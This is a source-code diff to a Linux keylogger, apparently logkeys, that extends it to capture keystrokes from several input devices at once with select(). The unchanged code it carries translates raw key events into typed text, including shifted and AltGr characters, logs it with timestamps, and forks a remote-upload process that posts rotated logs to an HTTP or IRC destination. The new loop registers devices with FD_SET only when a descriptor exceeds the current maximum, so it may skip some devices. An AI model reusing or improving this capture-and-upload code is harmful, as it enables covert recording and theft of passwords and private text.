@@ -74,13 +74,16 @@ std::string execute(const char* cmd)
     return result;
 }
 
-
-int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
+std::vector<int> input_fds;
+bool reading = true;
 
 void signal_handler(int signal)
 {
-  if (input_fd != -1)
-    close(input_fd);  // closing input file will break the infinite while loop
+  for(int i = 0; i < input_fds.size(); i++){
+    close(input_fds[i]);  // closing input files safely
+  } 
+  reading = false; // End while loop
+  
 }
 
 void set_utf8_locale()
@@ -115,7 +118,7 @@ void create_PID_file()
   }
   else {
     if (errno == EEXIST)
-         error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
+      error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
     else error(EXIT_FAILURE, errno, "Error opening PID file '" PID_FILE "'");
   }
 }
@@ -196,22 +199,22 @@ void determine_system_keymap()
       index = to_char_keys_index(i);
       
       ss << &line[14];  // 1st keysym starts at index 14 (skip "keycode XXX = ")
-      ss >> std::hex >> utf8code;
-      // 0XB00CLUELESS: 0xB00 is added to some keysyms that are preceeded with '+'; I don't really know why; see `man keymaps`; `man loadkeys` says numeric keysym values aren't to be relied on, orly?
-      if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00; 
-      char_keys[index] = static_cast<wchar_t>(utf8code);
+        ss >> std::hex >> utf8code;
+        // 0XB00CLUELESS: 0xB00 is added to some keysyms that are preceeded with '+'; I don't really know why; see `man keymaps`; `man loadkeys` says numeric keysym values aren't to be relied on, orly?
+        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00; 
+        char_keys[index] = static_cast<wchar_t>(utf8code);
       
-      // if there is a second keysym column, assume it is a shift column
-      if (ss >> std::hex >> utf8code) {
-        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
-        shift_keys[index] = static_cast<wchar_t>(utf8code);
-      }
+        // if there is a second keysym column, assume it is a shift column
+        if (ss >> std::hex >> utf8code) {
+          if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
+          shift_keys[index] = static_cast<wchar_t>(utf8code);
+        }
       
-      // if there is a third keysym column, assume it is an altgr column
-      if (ss >> std::hex >> utf8code) {
-        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
-        altgr_keys[index] = static_cast<wchar_t>(utf8code);
-      }
+        // if there is a third keysym column, assume it is an altgr column
+        if (ss >> std::hex >> utf8code) {
+          if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
+          altgr_keys[index] = static_cast<wchar_t>(utf8code);
+        }
       
       continue;
     }
@@ -324,7 +327,7 @@ void export_keymap_to_file()
   exit(EXIT_SUCCESS);
 }
 
-void determine_input_device()
+void determine_input_device(std::vector<std::string>& results)
 {
   // better be safe than sory: while running other programs, switch user to nobody
   setegid(65534); seteuid(65534);
@@ -336,7 +339,6 @@ void determine_input_device()
     EXE_GREP " -Eo 'event[0-9]+' ";
   std::stringstream output(execute(cmd));
   
-  std::vector<std::string> results;
   std::string line;
   
   while(std::getline(output, line)) {
@@ -361,7 +363,6 @@ void determine_input_device()
     error(EXIT_FAILURE, 0, "Please post contents of your /proc/bus/input/devices file as a new bug report. Thanks!");
   }
 
-  args.device = results[0];  // for now, use only the first found device
   
   // now we reclaim those root privileges
   seteuid(0); setegid(0);
@@ -412,12 +413,13 @@ int main(int argc, char **argv)
   else
     determine_system_keymap();
   
+  std::vector<std::string> results;
   if (args.device.empty()) {  // no device given with -d switch
-    determine_input_device();
+    determine_input_device(results);
   } 
   else {  // event device supplied as -d argument
     std::string::size_type i = args.device.find_last_of('/');
-    args.device = (std::string(INPUT_EVENT_PATH) + args.device.substr(i == std::string::npos ? 0 : i + 1));
+    results.push_back((std::string(INPUT_EVENT_PATH) + args.device.substr(i == std::string::npos ? 0 : i + 1)));
   }
   
   set_signal_handling();
@@ -436,11 +438,6 @@ int main(int argc, char **argv)
     close(STDOUT_FILENO);
   }
   
-  // open input device for reading
-  input_fd = open(args.device.c_str(), O_RDONLY);
-  if (input_fd == -1) {
-    error(EXIT_FAILURE, errno, "Error opening input event device '%s'", args.device.c_str());
-  }
   
   // if log file is other than default, then better seteuid() to the getuid() in order to ensure user can't write to where she shouldn't!
   if (args.logfile == DEFAULT_LOG_FILE) {
@@ -492,152 +489,179 @@ int main(int argc, char **argv)
   else
     file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
   fflush(out);
+
+  fd_set read_fds;
+  FD_ZERO(&read_fds);
+  int maxfd = -1;
+  for(unsigned long i = 0; i < results.size(); i++) {
+    int fd = open(results[i].c_str(), O_RDONLY);
+    if(fd < 0){
+      error(EXIT_FAILURE, errno, "Error opening input event device '%s'", results[i].c_str());
+    }
+    input_fds.push_back(fd);
+    if(maxfd < fd){
+      maxfd = fd;
+      FD_SET(fd, &read_fds);
+    }
+  }
   
-  // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
-  while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
+  // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fds)
+  while (reading) {
+    int x = select(maxfd+1, &read_fds, NULL, NULL, NULL);
+    for(unsigned long i = 0; i < input_fds.size() && x > 0; i++){
+      int input_fd = input_fds[i];
+      if(FD_ISSET(input_fd, &read_fds)){
+        read(input_fd, &event, sizeof(struct input_event));
     
-// these event.value-s aren't defined in <linux/input.h> ?
+        // these event.value-s aren't defined in <linux/input.h> ?
 #define EV_MAKE   1  // when key pressed
 #define EV_BREAK  0  // when key released
 #define EV_REPEAT 2  // when key switches to repeating after short delay
     
-    if (event.type != EV_KEY) continue;  // keyboard events are always of type EV_KEY
+        if (event.type != EV_KEY) continue;  // keyboard events are always of type EV_KEY
     
-    inc_size = 0;
-    scan_code = event.code;
+        inc_size = 0;
+        scan_code = event.code;
     
-    if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
-      inc_size += fprintf(out, "<E-%x>", scan_code);
-      if (inc_size > 0) file_size += inc_size;
-      continue;
-    }
-    
-    // if remote posting is enabled and size treshold is reached
-    if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
-      fclose(out);
-      
-      std::stringstream ss;
-      for (int i = 1;; ++i) {
-        ss.clear();
-        ss.str("");
-        ss << args.logfile << "." << i;
-        if (stat(ss.str().c_str(), &st) == -1) break;  // file .log.i doesn't yet exist
-      }
-      
-      if (rename(args.logfile.c_str(), ss.str().c_str()) == -1)  // move current log file to indexed
-        error(EXIT_FAILURE, errno, "Error renaming logfile");
-      
-      out = fopen(args.logfile.c_str(), "a");  // open empty log file with the same name
-      if (!out)
-        error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
-      
-      file_size = 0;  // new log file is now empty
-      
-      // write new timestamp
-      time(&cur_time);
-      strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
-      if (args.flags & FLAG_NO_TIMESTAMPS)
-        file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
-      else
-        file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
-      
-      if (!args.http_url.empty() || !args.irc_server.empty()) {
-        switch (fork()) {
-        case -1: error(0, errno, "Error while forking remote-posting process");
-        case 0:  
-          start_remote_upload();  // child process will upload the .log.i files
-          exit(EXIT_SUCCESS);
+        if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
+          inc_size += fprintf(out, "<E-%x>", scan_code);
+          if (inc_size > 0) file_size += inc_size;
+          continue;
         }
-      }
-    }
     
-    // on key repeat ; must check before on key press
-    if (event.value == EV_REPEAT) {
-      ++count_repeats;
-    } else if (count_repeats) {
-      if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL || 
-          prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  || 
-          prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // if repeated key is modifier, do nothing
-      else {
-        if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
-        else inc_size += fprintf(out, "<#+%d>", count_repeats);
-      }
-      count_repeats = 0;  // reset count for future use
-    }
-    
-    // on key press
-    if (event.value == EV_MAKE) {
+        // if remote posting is enabled and size treshold is reached
+        if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
+          fclose(out);
       
-      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
-      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
-          (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
-        if (ctrl_in_effect)
-          inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
-        if (args.flags & FLAG_NO_TIMESTAMPS)
-          inc_size += fprintf(out, "\n");
-        else {
-          strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
-        }
-        if (inc_size > 0) file_size += inc_size;
-        continue;  // but don't log "<Enter>"
-      }
-      
-      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
-        shift_in_effect = true;
-      if (scan_code == KEY_RIGHTALT)
-        altgr_in_effect = true;
-      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-        ctrl_in_effect = true;
-      
-      // print character or string coresponding to received keycode; only print chars when not \0
-      if (is_char_key(scan_code)) {
-        wchar_t wch;
-        if (altgr_in_effect) {
-          wch = altgr_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0') {
-            if(shift_in_effect)
-              wch = shift_keys[to_char_keys_index(scan_code)];
-            else
-              wch = char_keys[to_char_keys_index(scan_code)];
+          std::stringstream ss;
+          for (int i = 1;; ++i) {
+            ss.clear();
+            ss.str("");
+            ss << args.logfile << "." << i;
+            if (stat(ss.str().c_str(), &st) == -1) break;  // file .log.i doesn't yet exist
           }
-        } 
-        else if (shift_in_effect) {
-          wch = shift_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0')
-            wch = char_keys[to_char_keys_index(scan_code)];
+      
+          if (rename(args.logfile.c_str(), ss.str().c_str()) == -1)  // move current log file to indexed
+            error(EXIT_FAILURE, errno, "Error renaming logfile");
+      
+          out = fopen(args.logfile.c_str(), "a");  // open empty log file with the same name
+          if (!out)
+            error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
+      
+          file_size = 0;  // new log file is now empty
+      
+          // write new timestamp
+          time(&cur_time);
+          strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
+          if (args.flags & FLAG_NO_TIMESTAMPS)
+            file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
+          else
+            file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
+      
+          if (!args.http_url.empty() || !args.irc_server.empty()) {
+            switch (fork()) {
+            case -1: error(0, errno, "Error while forking remote-posting process");
+            case 0:  
+              start_remote_upload();  // child process will upload the .log.i files
+              exit(EXIT_SUCCESS);
+            }
+          }
         }
-        else  // neither altgr nor shift are effective, this is a normal char
-          wch = char_keys[to_char_keys_index(scan_code)];
+    
+        // on key repeat ; must check before on key press
+        if (event.value == EV_REPEAT) {
+          ++count_repeats;
+        } else if (count_repeats) {
+          if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL || 
+              prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  || 
+              prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // if repeated key is modifier, do nothing
+          else {
+            if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
+            else inc_size += fprintf(out, "<#+%d>", count_repeats);
+          }
+          count_repeats = 0;  // reset count for future use
+        }
+    
+        // on key press
+        if (event.value == EV_MAKE) {
+      
+          // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
+          if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
+              (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
+            if (ctrl_in_effect)
+              inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
+            if (args.flags & FLAG_NO_TIMESTAMPS)
+              inc_size += fprintf(out, "\n");
+            else {
+              strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
+              inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
+            }
+            if (inc_size > 0) file_size += inc_size;
+            continue;  // but don't log "<Enter>"
+          }
+      
+          if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
+            shift_in_effect = true;
+          if (scan_code == KEY_RIGHTALT)
+            altgr_in_effect = true;
+          if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
+            ctrl_in_effect = true;
+      
+          // print character or string coresponding to received keycode; only print chars when not \0
+          if (is_char_key(scan_code)) {
+            wchar_t wch;
+            if (altgr_in_effect) {
+              wch = altgr_keys[to_char_keys_index(scan_code)];
+              if (wch == L'\0') {
+                if(shift_in_effect)
+                  wch = shift_keys[to_char_keys_index(scan_code)];
+                else
+                  wch = char_keys[to_char_keys_index(scan_code)];
+              }
+            } 
+            else if (shift_in_effect) {
+              wch = shift_keys[to_char_keys_index(scan_code)];
+              if (wch == L'\0')
+                wch = char_keys[to_char_keys_index(scan_code)];
+            }
+            else  // neither altgr nor shift are effective, this is a normal char
+              wch = char_keys[to_char_keys_index(scan_code)];
         
-        if (wch != L'\0') inc_size += fprintf(out, "%lc", wch);  // write character to log file
-      }
-      else if (is_func_key(scan_code)) {
-        if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
-          inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
-        } 
-        else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
-          inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
+            if (wch != L'\0') inc_size += fprintf(out, "%lc", wch);  // write character to log file
+          }
+          else if (is_func_key(scan_code)) {
+            if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
+              inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
+            } 
+            else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
+              inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
+            }
+          }
+          else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
+        } // if (EV_MAKE)
+    
+        // on key release
+        if (event.value == EV_BREAK) {
+          if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
+            shift_in_effect = false;
+          if (scan_code == KEY_RIGHTALT)
+            altgr_in_effect = false;
+          if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
+            ctrl_in_effect = false;
         }
-      }
-      else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
-    } // if (EV_MAKE)
     
-    // on key release
-    if (event.value == EV_BREAK) {
-      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
-        shift_in_effect = false;
-      if (scan_code == KEY_RIGHTALT)
-        altgr_in_effect = false;
-      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-        ctrl_in_effect = false;
+        prev_code = scan_code;
+        fflush(out);
+        if (inc_size > 0) file_size += inc_size;
+    
+      } //if (can read fd)
+    }// for(unsigned long i = 0; i < fds.size() && x > 0; i++)
+    FD_ZERO(&read_fds);
+    for(unsigned long i = 0; i < input_fds.size() && x > 0; i++){
+      int fd = input_fds[i];
+      FD_SET(fd, &read_fds);
     }
-    
-    prev_code = scan_code;
-    fflush(out);
-    if (inc_size > 0) file_size += inc_size;
-    
-  } // while (read(input_fd))
+  } // while (1)
   
   // append final timestamp, close files and exit
   time(&cur_time);
